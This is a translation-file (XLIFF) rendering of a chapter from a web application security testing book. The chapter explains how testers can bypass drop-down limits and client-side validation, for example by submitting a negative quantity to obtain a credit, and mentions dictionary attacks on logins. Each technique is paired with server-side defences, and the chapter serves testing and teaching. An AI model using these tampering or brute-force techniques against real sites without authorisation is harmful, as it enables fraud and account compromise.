        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch03lev1sec1.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch03.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This chapter outlines attacks against ill-advised, client-side coding tricks that work on normal graphical user interface (GUI) applications but create security disasters in Web applications. The problem: Client-side code is too easy to tamper with. The lesson: You need to do all the important stuff on the server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Also see &lt;a class="docLink" href="ch05.html#ch05"&gt;Chapter 5&lt;/a&gt;, &amp;quot;Attacking User-Supplied Input Data,&amp;quot; for attacks against user input, which also affect the client.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch03.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch03lev1sec2.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch03lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Long before the Web existed, most software was self-contained on a single machine or executed in a closed (non Internet-facing) client-server environment. Such systems were the standard by which users judged software. Even today, people expect the open environment of the Web to provide a user experience that matches what they are used to from standalone software.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>But this is an unfair expectation. The Web is not the closed, predictable environment that a single computer or a closed network is. There are hazards on the Web that Web applications must navigate. Multiplatform client machines, statelessness, unknown and uncontrolled client-side resources, and malicious users are only the beginning of the list.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Web developers have a distinct problem: high user expectations that must be met within an environment that is too chaotic and untrustworthy to have any hope of success.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>But such is the lot of those who choose computing as their career. We do what we can. Many Web sites and Web applications have risen to this challenge. Sites that fail to meet this bar ultimately fizzle out. Survival of the fittest is the habitat of the World Wide Web.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>As discussed in &lt;a class="docLink" href="ch01.html#ch01"&gt;Chapter 1&lt;/a&gt;, &amp;quot;The Web Is Different,&amp;quot; the Web consists of a server machine that is &amp;quot;visited&amp;quot; by a client machine when the user of the client types a Web address (called a universal resource locator, or URL) into a client-side browser. The browser then accepts the code for the page from the remote server and executes it on the client machine.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This is a distinctly different situation from a self-contained application, where all the code is stored locally and a user is guided through the various screens and options on terms set by the application. In a closed environment, it is easy to remember where a user has been, what input he has entered, and what screen to load in response to that input.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>But the Web is stateless in that all &amp;quot;memory&amp;quot; of inputs and interaction must be stored on the server or on the client. The network offers no such storage mechanism, and it is doubtful that a hard drive for the Web is even on someone's design desk.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It is only at the endpoints of a Web connection that the concept of state exists. But because a Web user can restart a Web session at will (by re-entering the initial URL) or bypass the intended page sequence (by navigating the pages of a site directly using URLs instead of clicking links), a Web application has difficulty managing such state information.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Think about it like this. The Web is one tough neighborhood, and your users want to safely drive a luxury car through it, air conditioned and cruise controlled. Web developers need to provide this smooth ride. This chapter is about how to test for common bumps in the road.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 4 Bypass Restrictions on Input Choices</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In any application, users have to make choices. Whether these choices are what type of credit card to use, methods of shipping a purchased item, or the number of widgets they want to put in their shopping cart, the Web application must enable these choices in some way.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Web developers have any number of tools available to them to allow a rich user experience for entering these choices. In general, these tools are called &lt;span class="docEmphasis"&gt;user interface controls&lt;/span&gt; that consist of list boxes, text entry boxes, radio buttons, and so forth.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>User interface controls were developed when the computing world was moving from command-line and menu-driven interfaces to graphical user</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>interfaces (GUIs). The GUI allowed a user to see and enter multiple inputs in a single window, and controls were developed to make this experience as straightforward for the user as possible.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Some controls, like buttons, are simple, and the only real testing concern is clicking the button in some usage context. Other controls, like text boxes, allow a user to enter unrestricted text input that is then passed to the Web server. These are the controls we are most interested in for this attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Input ranges for interface controls can vary, and developers may want to impose restrictions on their usage. For example, we may want to limit a user to entering numbers only or restrict how many digits a user can enter into a specific text field. When this is the case, developers must be careful to allow only correctly formatted input and restrict illegal values from getting past the interface.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>More restrictive controls like list boxes and radio buttons allow a user to select from a set of predefined default values that the developer selects. For example, a list box for a Quantity field in an e-commerce site might have the values 1 through 10 listed for the user to choose from. Or an airline reservation system may have a multiline selection box with a list of all the airports they serve. Such controls prevent the user from entering incorrect or unacceptable values.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In the former case of free-range input, the onus is on the developer to ensure that the user selects valid input. After all, a user may leave a field empty or enter a value that is not acceptable to the Web application.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In the latter case of selection from a predefined set of values, developers have grown to trust these inputs without the need to check them for errors or omission. After all, how could the user choose an invalid value when only valid choices are presented?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This attitude of trusting the user interface is what this attack is all about. It underscores how the Web is different from traditional applications. The user interface presented by a Web application sits on a client computer and can easily be bypassed, allowing user input to be tampered with. No matter how good your GUI controls are, a savvy Web developer never trusts input that originates on a client machine.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You can use this attack wherever an input mechanism is provided, and in most applications, that's a lot of places! Check boxes, radio buttons, and drop-down list boxes (also called combo boxes) are the usual places to look. However, also look for standard text input boxes that have the number of characters they allow restricted by the &lt;tt&gt;MAXLENGTH&lt;/tt&gt; attribute on input elements, as the code snippet in &lt;a class="docLink" href="#ch03fig01"&gt;Figure 3-1&lt;/a&gt; shows.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 3-1. Restricting user input through the &lt;tt&gt;MAXLENGTH&lt;/tt&gt; attribute.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The purpose of this attack is to find input validation mechanisms that exist only on the client and that can be bypassed readily. We begin by identifying each control in our Web application and then investigating the input restrictions that the control imposes. The next step is implementing a bypass and seeing if we can use it to exploit the Web application.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>There are two ways to achieve this bypass: by modifying the source of the page, or by creating (or modifying en-route) the request sent when a user submits a form. We'll look at a simple source/page modification example first.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>When a user wants to purchase some arrangements in our sample application, he selects the number of each type via drop-down lists (refer to &lt;a class="docLink" href="#ch03fig02"&gt;Figure 3-2&lt;/a&gt;). To help with user selection and order-processing code on the server side, the programmer has restricted the choices the user can make for each arrangement from 0 to 10.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 3-2. Using a drop-down list to restrict values.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>These seem to be sensible choices from an application point of view, but malicious users rarely restrict themselves to the sensible, and the Web is not your typical application on a standalone computer. By saving the page locally, an attacker can view the source and modify whatever HTML code he wants, including these default restrictions.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Most Web browsers support saving pages and associated images locally. This allows an attacker to see such input restrictions and change them by modifying the underlying HTML pages. An attacker can use these modified pages in place of the pages served by the Web server, allowing him to send his own values to the remote server, regardless of the preset values in the original page.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&lt;a class="docLink" href="#ch03fig03"&gt;Figure 3-3&lt;/a&gt; shows modifying the quantity to be a negative amount. The page is then loaded from the local machine,&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch03tn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; the value chosen by the attacker is inserted, and the form is submitted to the server for processing. Because the programmer believes that he should only be receiving valid (and in-range) values, he often hasn't performed further server-side validation.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch03tn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; Any URLs in the source code that point to locations on the server&amp;mdash;particularly server-side scripts that have the extension .jsp or .asp&amp;mdash;must be converted to absolute URLs by including the entire URL before the call to the server-side component. For example, if a reference to 'loginprocess.asp' was in the source, an attacker would change it to 'http://192.168.206.126/loginprocess.asp'.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 3-3. Modifying the values in a drop-down list.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Using the value as-is does something strange to the system&amp;mdash;$21.50 times &amp;ndash;3 arrangements makes the total &amp;ndash;$64.50. If this total were blindly processed, it would mean that the attacker had just been given a $64.50 credit either through the store (perhaps taken off his current total order) or even credited directly to his card when he checks out. This is not a bug we want on our own site!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Instead of saving a page, modifying it offline, and then resending it, it's just as easy to change the values of any form using a proxy like that in &lt;a class="docLink" href="#ch03fig04"&gt;Figure 3-4&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 3-4. Using paros to modify values in-transit.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Another possible attack using this method of modifying a Web application's defaults is attempting to brute-force past authentication controls. Web applications communicate to the server via a simple mechanism known as the Common Gateway Interface (CGI). Data sent via links are contained within the URL after a question mark (?) as name=value pairs. Browsers do not contain mechanisms to prevent an attacker from sending such modified requests. And because the client-side part of the Web application is uninvolved, any mitigations coded there are useless.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>By using a program to automatically send these requests with values that are preselected or calculated on-the-fly, an attacker not only circumvents interface-imposed selection criteria, but he also generates substantially more input than he could possibly achieve by saving and editing the source for the application.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>For example, suppose that an attacker was trying to guess a login/password. He could use a dictionary attack against the login and password parameters and compare the responses for unsuccessful logins from the server to those of successful logins. This could clue in an attacker that he has guessed one of the parameters correctly and can concentrate on the other one. On the other hand, if he is trying to gather as much information</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>from an application as possible, he could sequentially iterate though a range for a given parameter (such as an ID number) and store the results.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>One of the main problems with Web applications, and a topic that we will be returning to over and over, is that the client cannot be trusted. Any restrictions put on the user that are enforced on the client &lt;span class="docEmphasis"&gt;must&lt;/span&gt; be revalidated on the server, where tampering is not so easy to accomplish.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 5 Bypass Client-Side Validation</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The validation of user input is a big issue for all software developers, whether they are building a Web application or a normal desktop program. However, unlike traditional applications, the Web gives a user a great deal of insight into how such validation is implemented. If the validation is sensitive, it is wise to revalidate it on the server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Most of the time, input validation is performed with some sort of user interface element like a drop-down list box restricting the user to certain inputs. The benefit of these controls (which exist on the client) is that the validation is performed quickly, and any error messages that may have to be generated tend to be more accurate because the error is raised as soon as the user makes a mistake.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In some cases, relying on user interface elements to restrict input is inappropriate or impossible. Take, for example, an e-mail address. The general format is name@organization.type. Developers may want to validate that users have entered a correct address. The problem is that there's significant variability in e-mail addresses, especially if the Web application wants to group users by name, domain, and type. Take both of our e-mail addresses, for example&amp;mdash;&lt;a class="docLink" href="mailto:mike.andrews@foundstone.com"&gt;mike.andrews@foundstone.com&lt;/a&gt; and &lt;a class="docLink" href="mailto:jw@cs.fit.edu"&gt;jw@cs.fit.edu&lt;/a&gt;. Neither fits directly into the general format.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Validating that someone has entered a valid e-mail address is difficult to perform with just user interface elements. We could allow the user to enter free-text and submit it to the server for validation, but that gives us two additional problems. The first problem is performance. Performing a round-trip to the server takes time and bandwidth, and that impacts &lt;span class="docEmphasis"&gt;all&lt;/span&gt; users connected to the Web server. The second problem is usability. Users like to be informed of errors they make and when they make them (a concept called &lt;span class="docEmphStrong"&gt;error locality&lt;/span&gt;) so that they can more readily fix the errors and resubmit the input.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>To help with this, some initial validation can be performed on the client. That's where scripting comes in. Scripting is a speedy way to get local error messages to the user.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Numerous scripting languages and environments are available to Web application designers/programmers, but the most common is JavaScript. Working on an event-driven model, client-side scripts run when the user performs an action (such as moving the cursor away from an input field, pressing a button, or other &amp;quot;event&amp;quot;).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Client-side scripting languages are able to do a lot of useful things, as we shall see with other attacks, but their most common use is to validate input as the user enters data. But we have to be careful what type of validation we do on the client, and we must remember that anything that happens on the client can and will be tampered with by a malicious user.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>An alternative to JavaScript that Web application developers use widely is a mechanism called &lt;span class="docEmphStrong"&gt;hidden fields&lt;/span&gt;. The actual validation of hidden fields occurs on the server, but it's easy to change or remove these requirements from the client application. For example, the following is a typical method for checking form elements using the Web application development environment ColdFusion:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;input type="text" name="StartDate" size="16"
 maxlength="16"&amp;gt;&amp;lt;br&amp;gt;
&amp;lt;input type="hidden" name="StartDate_required"
      value="You must enter a start date."&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>ColdFusion can perform many validation routines using this method. Each form field that is to be validated has a hidden field that starts with the same name but is followed by an underscore and the validation type, as follows:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;input type="hidden" name="quantity_cfforminteger"
value="You must enter a valid number."&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This code validates the form field &amp;quot;quantity&amp;quot; on the server to ensure that it is an integer.&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch03tn02"&gt;[2]&lt;/a&gt;&lt;/sup&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch03tn02"&gt;[2]&lt;/a&gt;&lt;/sup&gt; See &lt;a class="docLink" target="_blank" href="http://livedocs.macromedia.com/coldfusion/7/htmldocs/wwhelp/wwhimpl/common/html/wwhelp.htm?context=ColdFusion_Documentation&amp;amp;file=00001385.htm"&gt;http://livedocs.macromedia.com/coldfusion/7/htmldocs/wwhelp/wwhimpl/common/html/wwhelp.htm?context=ColdFusion_Documentation&amp;amp;file=00001385.htm&lt;/a&gt; for more information.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It's easy to see whether scripting is included on a page because it has to be marked up somewhere in the HTML source, or in other included files (usually with a .JS extention). Longer scripts are often contained within &lt;tt&gt;&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;&lt;/tt&gt; tags (sometimes with additional attributes to help the browser like what scripting language or version it is), but scripts also can be included in other HTML tags by prefixing them with &amp;quot;javascript:&amp;quot; and so forth.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Scripts are triggered by &amp;quot;events&amp;quot; on page elements, such as when a page has finished loading in the browser (&lt;tt&gt;OnLoad&lt;/tt&gt;), when a user moves away from a field (&lt;tt&gt;OnBlur&lt;/tt&gt;), or when a form is about to be sent to the server (&lt;tt&gt;OnSubmit&lt;/tt&gt;). If you see any of the &lt;tt&gt;&amp;lt;script&amp;gt;&lt;/tt&gt; tags or &lt;tt&gt;On****&lt;/tt&gt; attributes, there's a good chance that some validation is being performed on the client. In that case, you should check that the data is revalidated on the server. Details of how to accomplish this are in the next section.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If your Web application is running on a ColdFusion application server (in this case, filenames end in .cfm&amp;mdash;see &amp;quot;&lt;a class="docLink" href="ch07lev1sec2.html#ch07lev2sec3"&gt;Attack 19&amp;mdash;Fingerprinting the Server&lt;/a&gt;&amp;quot; in &lt;a class="docLink" href="ch07.html#ch07"&gt;Chapter 7&lt;/a&gt;, &amp;quot;Attacking the Server&amp;quot;), you will want to look for hidden fields in addition to scripts.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>A tester wants to discover what client-side validation is being performed, remove that validation, and see if the same validation is being enforced by the server. Any mismatches are cause for a bug report.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>There are two ways to do this.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>The first is to &amp;quot;turn off&amp;quot; the ability to run scripts in the browser.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This can either be done by using the browser settings or by using an extension like Chris Pederick's Web developer toolbar for Firefox (&lt;a class="docLink" target="_blank" href="http://www.chrispederick.com/work/firefox/webdeveloper/"&gt;http://www.chrispederick.com/work/firefox/webdeveloper/&lt;/a&gt;), which allows you to turn on/off and modify various aspects of the page. This is a bit like using a sledgehammer to crack a nut, though. Not all scripting has to be disabled to test a particular form element. Furthermore, turning off</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>scripting on the entire page can break other unrelated features like navigation bars, so tread carefully if this is the route you choose.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The second way to remove client-side validation is to selectively disable it. By performing a similar trick to the previous attack, you can save a page locally, remove validation by editing the HTML, and reload the page. Simply deleting the &lt;tt&gt;On****&lt;/tt&gt; handler for the element you are testing in the local copy of the page and changing relative URLs into absolute URLs (as described in the previous attack) is enough.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>For a page with lots of form elements, removing all cases of validation and fixing relative links can be tedious. Fortunately, there's a programmatic way of performing this task using the browser's Document Object Model (DOM).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Both Internet Explorer and Firefox have programming interfaces that allow developers to query the document within the browser and to change some of its values. This functionality was originally intended for dynamic HTML (DHTML). In that way, scripting languages can implement dynamic UI functionality such as pop-up menus but, as is often the case, this functionality has been turned to darker purposes.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Firefox comes with a DOM inspector that allows you to walk over the document and change values and attributes, but it shows &lt;span class="docEmphasis"&gt;everything&lt;/span&gt;, and for large, complex pages, it's a bit clunky to use.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Implementing a modified DOM inspector yourself by using a browser extension or a plug-in that hosts a browser is quite simple. It can iterate over all the page elements and see if they have scripts associated with them. Alternatively, through the DOM, it can turn individual or multiple scripts off. The PageSpy tool provided on the accompanying CD (source code included) does this exact task.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 3-5. Using PageSpy to remove JavaScript from input controls.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>When encountering the ColdFusion method of validating inputs, you can use the same technique. Either remove the hidden field completely, or change its name so that it is no longer associated with the field element you are testing.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The main issue that makes this attack successful is trusting the client to do the right thing. Even if you're performing client-side validation, you have to make sure that it is the same validation that is being done on the server. Any potential mismatch means that some bad data can slip though and cause maintenance headaches for developers later on in the lifetime of the system.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>When in doubt, perform all validation on the server, remembering that your Web application is taking a performance hit by doing so.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h2.text">
